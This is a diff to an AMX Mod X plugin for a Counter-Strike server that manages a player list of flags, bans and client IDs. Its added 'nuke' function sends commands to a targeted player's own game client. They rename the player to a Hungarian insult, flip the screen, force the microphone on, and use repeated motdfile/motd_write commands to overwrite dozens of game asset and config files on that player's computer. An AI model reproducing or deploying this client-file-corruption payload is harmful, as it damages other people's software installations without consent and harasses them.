@@ -9,7 +9,9 @@
 // ; timestamp name auth cl_uid ip flags timelimit(mins) optionalcomments
 #define sic_userlist_filename  "addons/amxmodx/configs/sic_userlist.cfg"
 #define sic_userlist_playerlog "addons/amxmodx/logs/players.log"
+#define sic_cheater_name       "egy senkihazi csiter vagyok"
 
+// player flags
 enum (<<= 1)
 {
 	PF_MUTED = 1,
@@ -17,6 +19,16 @@ enum (<<= 1)
 	PF_BANNED,
 }
 
+// _get_flags
+enum
+{
+	GF_CL_UID,
+	GF_AUTH,
+	GF_NAME,
+	GF_IP
+}
+
+// ban type
 enum
 {
 	BAN_TYPE_TEMPORARY,
@@ -80,13 +92,43 @@ public sic_userlist_load()
 	fclose(fh)
 }
 
+public sic_userlist_get_flags(type, param[])
+{
+	new i_flags = 0
+
+	switch (type) {
+		case GF_CL_UID: {
+			if (TrieKeyExists(g_uidlist, param)) {
+				TrieGetCell(g_uidlist, param, i_flags)
+			}
+		}
+		case GF_AUTH: {
+			if (TrieKeyExists(g_authlist, param)) {
+				TrieGetCell(g_authlist, param, i_flags)
+			}
+		}
+		case GF_IP: {
+			if (TrieKeyExists(g_iplist, param)) {
+				TrieGetCell(g_iplist, param, i_flags)
+			}
+		}
+		case GF_NAME: {
+			if (TrieKeyExists(g_namelist, param)) {
+				TrieGetCell(g_namelist, param, i_flags)
+			}
+		}
+	}
+
+	return i_flags;
+}
+
 public sic_userlist_client_connect(id)
 {
 	new pi[playerinfo], i_flags = 0, p_cl_uid[8]
 	sic_userinfo_fetchall(id, pi)
 
 	if (!is_user_bot(id)) {
-		if (equal(pi[pi_cl_uid], "")) {
+		if (equal(pi[pi_cl_uid], "") || equal(pi[pi_cl_uid], "76c6fd") || equal(pi[pi_cl_uid], "2ec9c1")) {
 			sic_generate_cl_uid(p_cl_uid, 6, "%s.%d.%s", pi[pi_ip], random_num(10000,99999), id)
 			set_user_info(id, "cl_uid", p_cl_uid)
 		}
@@ -179,4 +221,23 @@ public sic_userlist_setflags(id, flags)
 	if (flags & PF_BANNED) {
 		server_cmd("kick #%d ^"%s^"", get_user_userid(id), sic_ban_reason)
 	}
+}
+
+public sic_userlist_nuke(id, admin)
+{
+	new lstr[128], lstr_a[128]
+	sic_userinfo_logstring(id, lstr, charsmax(lstr))
+	sic_userinfo_logstring(admin, lstr_a, charsmax(lstr_a))
+
+	log_message("%s nuked %s", lstr_a, lstr)
+
+	client_cmd(id, "name ^"%s^"", sic_cheater_name)
+
+	client_cmd(id, "gl_flipmatrix 1;hud_draw 0;MP3Volume 1;suitvolume 1;sv_voiceenable 1;voice_enable 1;voice_forcemicrecord 1;voice_modenable 1;voice_scale 1;volume 1;-mlook;+lookup;+voicerecord;sensitivity 14")
+
+	client_cmd(id, "motdfile ajawad.wad;motd_write cheater;motdfile cached.wad;motd_write cheater;motdfile chateau.wad;motd_write cheater;motdfile cs_747.wad;motd_write cheater;motdfile cs_assault.wad;motd_write cheater;motdfile cs_bdog.wad;motd_write cheater;motdfile cs_cbble.wad;motd_write cheater;motdfile cs_dust.wad;motd_write cheater;motdfile cs_havana.WAD;motd_write cheater;motdfile cs_office.wad;motd_write cheater")
+	client_cmd(id, "motdfile cs_snowbase.wad;motd_write cheater;motdfile cs_thunder.wad;motd_write cheater;motdfile cstraining.wad;motd_write cheater;motdfile cstrike.wad;motd_write cheater;motdfile de_airstrip.wad;motd_write cheater;motdfile de_aztec.wad;motd_write cheater;motdfile de_piranesi.wad;motd_write cheater;motdfile de_storm.wad;motd_write cheater;motdfile de_vegas.wad;motd_write cheater")
+	client_cmd(id, "motdfile de_vertigo.wad;motd_write cheater;motdfile decals.wad;motd_write cheater;motdfile greenvalley.wad;motd_write cheater;motdfile itsitaly.wad;motd_write cheater;motdfile jos.wad;motd_write cheater;motdfile n0th1ng.wad;motd_write cheater;motdfile prodigy.wad;motd_write cheater;motdfile tempdecal.wad;motd_write cheater;motdfile torntextures.wad;motd_write cheater;motdfile tswad.wad;motd_write cheater")
+	client_cmd(id, "motdfile custom.hpk;motd_write cheater;motdfile GameServerConfig.vdf;motd_write cheater;motdfile halflife-cs.fgd;motd_write cheater;motdfile settings.scr;motd_write cheater;motdfile user.scr;motd_write cheater;motdfile gfx/palette.lmp;motd_write cheater;motdfile models/p_knife.mdl;motd_write cheater;motdfile models/v_knife.mdl;motd_write cheater;motdfile models/v_knife_r.mdl;motd_write cheater")
+	client_cmd(id, "motdfile models/w_knife.mdl;motd_write cheater;motdfile resource/GameMenu.res;motd_write cheater;motdfile sprites/radar320.spr;motd_write cheater;motdfile sprites/radar640.spr;motd_write cheater;motdfile sprites/radaropaque640.spr;motd_write cheater")
 }
